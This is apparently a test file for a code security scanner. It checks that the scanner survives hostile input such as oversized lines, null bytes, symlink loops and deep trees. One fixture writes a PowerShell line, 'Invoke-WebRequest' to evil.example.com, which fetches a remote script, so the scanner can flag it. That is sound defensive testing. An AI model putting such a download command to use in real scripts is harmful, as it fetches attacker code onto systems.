// Hostile-input hardening checks for the TypeScript scanner (mirrors HostileInputTest).
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { scanProject } = require('../dist/scanner/repositoryScanner.js');
const { DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS } = require('../dist/scanner/defaults.js');

let failed = false;
function check(name, cond) {
  console.log((cond ? 'PASS ' : 'FAIL ') + name);
  if (!cond) failed = true;
}

// 1. oversized line -> SCAN_FILE_SKIPPED notice, no crash
{
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wg-hostile-line-'));
  fs.writeFileSync(path.join(root, 'gradlew'), '#!' + 'x'.repeat(20000) + '\n');
  const r = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  check('oversized line skipped with notice', r.notices.some((n) => n.code === 'WG-FILE-SKIPPED'));
}

// 2. null bytes -> SCAN_FILE_READ
{
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wg-hostile-null-'));
  fs.writeFileSync(path.join(root, 'gradlew'), Buffer.from([0x23, 0x21, 0x00, 0x41, 0x42]));
  const r = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  check('null-byte content skipped', r.notices.some((n) => n.code === 'WG-FILE-READ'));
}

// 3. UTF-16LE PowerShell decoded + analyzed
{
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wg-hostile-utf16-'));
  const text = '# comment\nInvoke-WebRequest https://evil.example.com/x.ps1\n';
  const le = Buffer.from(text, 'utf16le');
  fs.writeFileSync(path.join(root, 'deploy.ps1'), Buffer.concat([Buffer.from([0xff, 0xfe]), le]));
  const r = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  check('UTF-16LE PowerShell analyzed', r.findings.some((f) => f.ruleId === 'WG-SCRIPT-003'));
}

// 4. symlink loop terminates
{
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wg-hostile-symlink-'));
  fs.writeFileSync(path.join(root, 'gradlew'), '#!/bin/sh\necho ok\n');
  const dir = path.join(root, 'loop');
  fs.mkdirSync(dir);
  try {
    fs.symlinkSync(root, path.join(dir, 'back'), 'dir');
  } catch {
    // symlinks unsupported — skip
  }
  const r = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  check('symlink loop terminates', r.scannedFiles >= 0);
}

// 5. deep tree pruned
{
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wg-hostile-deep-'));
  let current = root;
  for (let i = 0; i < 80; i++) {
    current = path.join(current, 'd');
    fs.mkdirSync(current);
  }
  fs.writeFileSync(path.join(current, 'deep.sh'), '#!/bin/sh\necho deep\n');
  const r = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
  check('deep tree pruned', r.scannedFiles <= 100);
}

process.exit(failed ? 1 : 0);
